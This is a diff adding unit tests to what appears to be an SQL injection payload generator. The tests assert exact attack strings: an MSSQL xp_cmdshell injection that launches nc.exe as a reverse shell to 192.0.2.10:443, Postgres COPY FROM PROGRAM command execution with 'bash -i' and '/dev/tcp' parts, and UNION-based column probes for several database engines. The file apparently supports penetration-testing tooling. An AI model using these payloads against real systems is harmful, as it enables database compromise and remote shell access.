@@ -132,4 +132,39 @@ describe("buildSql", () => {
     }
     expect(checked).toBeGreaterThan(150);
   });
+
+  it("nc-exe url-param is complete: default path, %2d flag, no unresolved", () => {
+    const b = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { LHOST: "192.0.2.10", LPORT: "443", shell: "nc-exe" });
+    expect(b.unresolved).toEqual([]);
+    expect(b.text).toBe("%27%3B+EXEC+xp_cmdshell+%27C:%5CWindows%5CTemp%5Cnc.exe+%2de+cmd.exe+192.0.2.10+443%27%3B--+-");
+  });
+
+  it("postgres-copy-program creates its table first", () => {
+    const b = buildSql("postgres-copy-program", "postgres", "form-field", { ...V, table: "cmd_exec" });
+    expect(b.text).toMatch(/^'; CREATE TABLE IF NOT EXISTS cmd_exec\(cmd_output text\); COPY cmd_exec FROM PROGRAM /);
+    expect(b.parts.some((p) => p.token === "CREATE TABLE")).toBe(true);
+  });
+
+  it("reflected-columns labels one column on strict engines, all on mysql", () => {
+    expect(buildSql("reflected-columns", "postgres", "form-field", { columns: 3, reflected: 2 }).text).toBe("' AND 1=2 UNION SELECT NULL,'c2',NULL-- -");
+    expect(buildSql("reflected-columns", "mssql", "form-field", { columns: 3 }).text).toBe("' AND 1=2 UNION SELECT 'c1',NULL,NULL-- -");
+    expect(buildSql("reflected-columns", "oracle", "form-field", { columns: 2 }).text).toBe("' AND 1=2 UNION SELECT 'c1',NULL FROM dual-- -");
+    expect(buildSql("reflected-columns", "mysql", "form-field", { columns: 3 }).text).toBe("' AND 1=2 UNION SELECT 'c1','c2','c3'-- -");
+    expect(buildSql("reflected-columns", "postgres", "form-field", { columns: 3 }).notes.join(" ")).toMatch(/once per column/);
+  });
+
+  it("embedded shell parts are explained", () => {
+    const ps = buildSql("mssql-xp_cmdshell", "mssql", "form-field", V).parts.map((p) => p.token).join("|");
+    expect(ps).toContain("-nop");
+    expect(ps).toContain("-e");
+    const pg = buildSql("postgres-copy-program", "postgres", "form-field", V).parts.map((p) => p.token).join("|");
+    expect(pg).toContain("bash -i");
+    expect(pg).toContain("/dev/tcp");
+  });
+
+  it("detect-error never returns an empty payload", () => {
+    const b = buildSql("detect-error", "mysql", "form-field", { prefix: "" });
+    expect(b.text).toBe("'");
+    expect(b.notes.join(" ")).toMatch(/Numeric context/);
+  });
 });
